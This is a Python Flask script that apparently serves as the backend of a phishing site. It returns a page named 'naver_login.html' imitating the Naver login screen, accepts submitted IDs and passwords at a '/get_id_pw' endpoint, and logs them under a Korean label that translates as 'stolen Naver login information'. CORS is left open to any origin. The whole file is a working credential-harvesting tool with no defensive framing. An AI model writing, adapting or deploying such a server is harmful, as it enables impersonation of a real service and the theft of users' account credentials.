from flask import Flask, request, jsonify
from flask_cors import CORS
from flask import send_from_directory

import pathlib

import logging
from logging.handlers import RotatingFileHandler


app = Flask(__name__)

# cors 설정
CORS(app)


# LOG_FORMATTER = logging.Formatter(
#     "%(asctime)s - %(name)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d:%H:%M:%S"
# )

logger = app.logger
logger.setLevel(logging.INFO)

# my_test_log_handler = logging.StreamHandler()
# my_test_log_handler.setLevel(logging.INFO)

# my_test_log_handler.setFormatter(LOG_FORMATTER)

# logger.addHandler(my_test_log_handler)


CURRENT_DIR = pathlib.Path(__file__).parent.resolve()

print(CURRENT_DIR)


@app.route("/")
def login_page():
    return send_from_directory(CURRENT_DIR, "naver_login.html")


@app.route("/get_id_pw", methods=["OPTIONS", "POST"])
def get_id_pw():
    response = jsonify({"status": "ok"})
    if request.method == "POST":
        req_json = request.get_json()

        id = req_json["id"]
        pw = req_json["pw"]

        logger.info(f"[탈취한 네이버 로그인 정보] id: {id} / pw: {pw}")

        return response
    elif request.method == "OPTIONS":
        response.headers.add("Access-Control-Allow-Credentials", True)
    return response
